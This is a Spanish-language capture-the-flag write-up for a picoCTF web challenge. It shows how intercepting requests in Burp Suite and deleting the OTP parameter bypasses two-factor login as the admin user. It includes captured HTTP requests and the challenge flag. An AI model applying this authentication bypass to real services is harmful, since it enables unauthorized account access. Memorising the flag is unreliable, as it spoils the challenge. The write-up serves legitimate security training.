## Descripción
Try [here](http://titan.picoctf.net:51565/) to find the flag
## Solución
Iniciamos Burp Suite y le decimos que empiece a escuchar. En el primer Login que se pueden colocar los campos sin validar Burp Suite nos devuelve esto:
```
POST / HTTP/1.1
Host: titan.picoctf.net:51565
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 174
Origin: http://titan.picoctf.net:51565
Connection: keep-alive
Referer: http://titan.picoctf.net:51565/
Cookie: session=.eJw9jEsKAyEQRO_iOovpdvzlMqJjDwmZUfFDCCF3jwHJruoVr95su7cXuzJgF7bVstuWHhQH8IaTBhFWWiRo5FJxGVzQTmgEuXg0Xhi3quHt_ThsdCfNn9TySKgU4K9mV-szlTDXfEuRbOynpzJRr1T-_ucLO9Iqcw.Z-d7TA.MSmRzvpajyxE6HmzTUJ60L_8tO0
Upgrade-Insecure-Requests: 1
Priority: u=0, i

csrf_token=ImI5M2U4MTVkNGUwNjE4MjM2NzM2ZGFkOGE1ODIxNjBiMjliNTlhNDci.Z-d7Rg.vpfwbVGScV5e7I084EE_rMqMm2I&full_name=1&username=1&phone_number=1&city=1&password=1&submit=Register
```
Si le damos a forward algunas veces el navegador carga otra página que nos pide un OTP.
```
POST /dashboard HTTP/1.1
Host: titan.picoctf.net:51565
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 8
Origin: http://titan.picoctf.net:51565
Connection: keep-alive
Referer: http://titan.picoctf.net:51565/dashboard
Cookie: session=.eJw9jFsKwyAUBfdyv_sRNRrtZuQab2hpouKDUkr3HgPSv8MMc76wPusH7sDgBmvJm63xRaEDZwRpJv1Mk2KaC7UI5dFrlJozNTlunDQ4L73b2r7bgAeNn1hTX0r25tIJS3nH7IdNjxjIhnY4ygO1Qvnf_04-uSqB.Z-d7zg.KNKnYhc4myevgR5v7BG_6ei6exM
Upgrade-Insecure-Requests: 1
Priority: u=0, i

otp=hola
```
Si seguimos con un forward el navegador solo nos dice que el OTP es inválido pero si quitamos el OTP desde Burp Suite nos va a dar la bandera.
```
Welcome, admin you sucessfully bypassed the OTP request. Your Flag: picoCTF{#0TP_Bypvss_SuCc3$S_b3fa4f1a}
```
## Notas adicionales
- Tenemos que ingresar como `admin` ya que con otro nombre no funcionará el borrar el OTP
- En Burp Suite en la sección de settings tenemos que activar la opción de "Intercept responses based on the following rules:"
## Referencias
https://www.bancosantander.es/glosario/otp